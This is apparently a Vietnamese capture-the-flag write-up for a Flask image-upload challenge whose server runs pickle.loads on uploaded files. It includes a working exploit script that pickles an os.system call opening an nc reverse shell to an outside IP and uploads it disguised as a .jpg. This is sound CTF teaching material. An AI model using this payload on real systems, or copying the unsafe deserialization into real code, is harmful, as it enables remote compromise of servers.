# `Imported Kimchi 2`

Source:
```python
import uuid
from flask import *
from flask_bootstrap import Bootstrap
import pickle
import os

app = Flask(__name__)
Bootstrap(app)

app.secret_key = 'sup3r s3cr3t k3y'

ALLOWED_EXTENSIONS = set(['png', 'jpg', 'jpeg'])

images = set()
images.add('bibimbap.jpg')
images.add('galbi.jpg')
images.add('pickled_kimchi.jpg')

@app.route('/')
def index():
    return render_template("index.html", images=images)

@app.route('/upload', methods=['GET', 'POST'])
def upload():
    if request.method == 'POST':
        image = request.files["image"]
        if image and image.filename.split(".")[-1].lower() in ALLOWED_EXTENSIONS:
            # special file names are fun!
            extension = "." + image.filename.split(".")[-1].lower()
            fancy_name = str(uuid.uuid4()) + extension

            image.save(os.path.join('./images', fancy_name))
            flash("Successfully uploaded image! View it at /images/" + fancy_name, "success")
            return redirect(url_for('upload'))

        else:
            flash("An error occured while uploading the image! Support filetypes are: png, jpg, jpeg", "danger")
            return redirect(url_for('upload'))

    else:
        return render_template("upload.html")

@app.route('/images/<filename>')
def display_image(filename):
    try:
        pickle.loads(open('./images/' + filename, 'rb').read())
    except:
        pass
    return send_from_directory('./images', filename)

if __name__ == "__main__":
    app.run(host='0.0.0.0')
```

Check sơ qua source thì ta thấy web có chức năng upload ảnh và check extension bằng white box -> chỗ này khá khó để bypass extension.

Mình đã chuyển xuống dưới xem có gì khả nghi không thì thấy có 1 `pickle` là lạ nên mình đã tra gg và ra được là hàm này có dùng để khai thác RCE.

Đây là trang web mình tham khảo để khai thác RCE: https://www.landgrey.me/static/upload/2019-09-15/fwxkilqj.pdf

Sau 1 hồi nghiên cứu thì mình viết được script gen ra file image với content là payload để RCE:

Script:

```python
import os
import pickle
import requests
from bs4 import BeautifulSoup as bs
import html5lib

class A(object):
    def __reduce__(self):
        return os.system, ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.127.72 5556 >/tmp/f', )
        # Mọi người thay đổi ip và port để có thể kết nối đến máy chủ

def main():
    url = "https://imported-kimchi-2.cha.hackpack.club/upload"
    # taọ ra file image chứa payload để RCE
    p = pickle.dumps(A())
    with open("b.jpg", "wb") as f:
        f.write(p)

    res = requests.post(url, files={("image", open("b.jpg", "rb"))}).text
    soup = bs(res, "html5lib")

    print(soup.find("div", class_="alert alert-success").text)

if __name__ == "__main__":
    main()
```

Rồi truy cập vào máy của mình sẽ thấy báo là RCE thành công.

Vì mình giải được bài này khi giải đã kết thúc nên không lấy được Flag. Mọi người có thể chạy trên local bằng source trên.

Cảm ơn các bạn đã đón đọc.
